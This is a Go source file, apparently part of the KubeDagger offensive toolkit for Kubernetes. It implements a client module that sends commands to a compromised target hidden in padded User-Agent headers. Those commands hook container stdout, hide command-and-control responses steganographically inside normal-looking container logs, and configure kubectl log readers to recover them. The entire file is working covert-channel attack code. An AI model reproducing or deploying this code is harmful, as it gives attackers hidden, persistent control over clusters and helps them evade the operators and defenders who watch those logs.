package container_log_c2

import (
	"encoding/json"
	"fmt"
	"net/http"
	"os"
	"strings"

	"github.com/yasindce1998/KubeDagger/cmd/kubedagger-client/run/model"
)

type LogC2Result struct {
	Actions []ActionInfo `json:"actions"`
	Success bool         `json:"success"`
}

type ActionInfo struct {
	Name   string `json:"name"`
	Status string `json:"status"`
	Detail string `json:"detail"`
}

func Execute(target, container, encoding, output string) error {
	result := &LogC2Result{}

	actions := []struct {
		name   string
		detail string
		cmd    string
	}{
		{
			"hook_container_stdout",
			"intercept container stdout/stderr write path for steganographic encoding",
			"logc2_hook_stdout",
		},
		{
			"configure_encoding",
			"set encoding scheme for embedding C2 data in log messages",
			"logc2_set_encoding",
		},
		{
			"inject_c2_data",
			"embed encoded command responses in normal-looking container log output",
			"logc2_inject_data",
		},
		{
			"setup_reader",
			"configure kubectl logs reader to extract and decode hidden C2 responses",
			"logc2_setup_reader",
		},
	}

	for _, a := range actions {
		cmd := a.cmd + "#" + container + "#" + encoding
		status := sendCommand(target, cmd)
		result.Actions = append(result.Actions, ActionInfo{
			Name:   a.name,
			Status: status,
			Detail: a.detail,
		})
	}

	result.Success = allSucceeded(result.Actions)

	data, _ := json.MarshalIndent(result, "", "  ")
	if output != "" {
		return os.WriteFile(output, data, 0644)
	}
	fmt.Println(string(data))
	return nil
}

func sendCommand(target, command string) string {
	ua := buildUserAgent(command)

	req, err := http.NewRequest("GET", target+"/container_log_c2", nil)
	if err != nil {
		return "error: " + err.Error()
	}
	req.Header.Set("User-Agent", ua)

	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		return "error: " + err.Error()
	}
	defer resp.Body.Close()

	if resp.StatusCode == http.StatusOK {
		return "enabled"
	}
	return fmt.Sprintf("failed (HTTP %d)", resp.StatusCode)
}

func buildUserAgent(command string) string {
	userAgent := command
	for len(userAgent) < model.UserAgentPaddingLen {
		userAgent += "#"
	}
	return userAgent
}

func allSucceeded(actions []ActionInfo) bool {
	for _, a := range actions {
		if !strings.HasPrefix(a.Status, "enabled") {
			return false
		}
	}
	return true
}
